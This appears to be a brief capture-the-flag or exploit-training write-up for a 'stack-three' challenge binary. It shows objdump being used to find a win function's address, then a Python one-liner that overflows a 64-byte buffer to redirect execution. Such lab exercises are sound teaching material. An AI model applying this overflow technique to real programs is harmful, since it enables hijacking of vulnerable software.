#Working on the problem
First is to use objdump to find the address of the win function.
```
objdump -M intel -d stack-three | grep "complete_level"
```
This nets the memory address 
```
000000000040069d 
```
Now to create the overflow and redirect code execution.
#Final Answer
```
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x9d\x06\x40")' | ./stack-three
```
